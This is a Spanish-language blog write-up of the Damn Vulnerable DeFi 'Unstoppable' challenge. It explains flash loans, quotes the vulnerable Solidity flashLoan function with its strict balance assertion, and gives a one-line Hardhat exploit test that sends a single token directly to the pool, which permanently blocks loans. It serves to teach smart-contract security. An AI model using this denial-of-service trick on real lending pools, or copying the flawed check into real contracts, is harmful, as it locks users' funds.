---
title: Solucion al challenge \#1 Unstoppable
date: 2022-01-2
excerpt: Challenge; hay una lending pool con un millon de tokens DVT, estan ofreciendo flash loans gratis. Si tan solo existiera una forma de atacar la pool y detenerla... Comenzaras con 100 DVT tokens.
---

### Antes que nada que es un flash loan?

Un flash loan es un prestamo que se puede pedir a travez de un contrato sin la necesidad de poner un colateral. El funcionamiento es bastante sencillo, hay un contrato que contiene los tokens a ser prestados, mediante otro contrato se pide prestada la cantidad deseada, el contrato entrega los tokens y devuelve el control al contrato que hizo el prestamo, luego esos tokens se utilizan y se devuelven.

[Flash loans por binance academy](https://academy.binance.com/es/articles/what-are-flash-loans-in-defi)

# Cual es el problema con Unstoppable

Unstoppable es una pool que ofrece flash loans, el problema principal es que tiene un bug que permite a un usuario malicioso bloquear todos los tokens para siempre y que nadie mas pueda pedir un prestamo.

El problema esta en la linea 40 del contrato *UnstoppableLender.sol* donde hace este require `assert(poolBalance == balanceBefore);` 

[UnstoppableLender.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/unstoppable/UnstoppableLender.sol#L40)
```js
  // Function para pedir el flashloan contrato UnstoppableLender.sol
  function flashLoan(uint256 borrowAmount) external nonReentrant {
    require(borrowAmount > 0, "Must borrow at least one token");

    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    // Ensured by the protocol via the `depositTokens` function
    assert(poolBalance == balanceBefore);
    
    damnValuableToken.transfer(msg.sender, borrowAmount);
    
    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
    
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
  }
```

## Vector de ataque

Este tipo de ataque se los conoce como [*DoS* _denial of service_](https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert)

Para ejecutar este ataque solo basta con enviar un token DVT al lending pool, de esta forma la variable `poolBalance` jamas sera igual a `balanceBefore`, esto se debe a que la variable poolBalance cambia usando la funcion `deposit` y `balanceBefore` usa un `balanceOf`, en resumen, este contrato espera que solo depositen DVT tokens a travez de la funcion deposit y no tiene que encuenta que alguien podria transferir tokens DVT por que si.

## Exploit

Solo basta agregar esto en [unstoppable.challenge.js](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/unstoppable/unstoppable.challenge.js#L41)

```js
    it('Exploit', async function () {
        await this.token.connect(attacker).transfer(this.pool.address, "1");
    });
```

Luego correr el test;
```
$: npx hardhat test test/unstoppable/unstoppable.challenge.js

  [Challenge] Unstoppable
    ✓ Exploit


  1 passing (858ms)

```